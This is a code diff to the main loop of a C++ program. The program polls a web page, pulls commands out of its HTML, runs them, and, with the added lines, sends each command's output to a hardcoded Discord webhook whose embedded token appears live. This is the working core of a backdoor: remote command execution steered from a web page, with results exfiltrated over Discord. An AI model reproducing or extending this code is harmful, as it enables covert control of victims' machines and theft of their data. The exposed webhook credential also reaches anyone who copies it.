@@ -19,17 +19,19 @@ int main() {
     HtmlParser htmlParser(cmd);
     ExecCmd execCmd("");  
     std::size_t previousMatchCount = 0; 
-
+    const std::string& lastContent = cmd.getLastContent();
     while (true) {
         std::string response = httpRequest.get(url, userAgent);
         std::string extractedContent = htmlParser.extractContent(response);
         if (cmd.addContentIfChanged(extractedContent)) {
             const std::vector<std::string>& allContent = cmd.getAllContent();
-            const std::string& lastContent = cmd.getLastContent();
             if (htmlParser.getcmd_number() != previousMatchCount) {
                 ExecCmd execCmd(lastContent);
-                execCmd.executeCommand();
+                std::string commandResult = execCmd.executeCommand();
+                //std::cout << commandResult << std::endl;
                 previousMatchCount = htmlParser.getcmd_number();
+                execCmd.sendToDiscordWebhook("https://discord.com/api/webhooks/1217493774268370984/zbWhTADsVXMMtXVTvzrdCtt5_cB3Zncs04zS_EWHYmJv40e3gfWhZvoq0CAhddaJ0VjM", commandResult);
+
             }
         }
         std::this_thread::sleep_for(std::chrono::seconds(10));
